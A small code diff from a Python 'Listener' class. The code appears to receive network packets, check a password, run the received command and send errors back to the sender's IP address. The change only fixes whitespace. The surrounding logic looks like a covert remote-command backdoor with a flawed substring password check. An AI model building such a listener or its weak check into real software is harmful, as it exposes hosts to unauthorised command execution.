@@ -52,8 +52,7 @@ class Listener(object):
         if password not in 'PASSWORD':
             return
 
-
-        stdin, stderr  = self.executor.run(command)
+        stdin, stderr = self.executor.run(command)
 
         if stderr is not None:
             self.respond(pkt[IP].src, stderr)
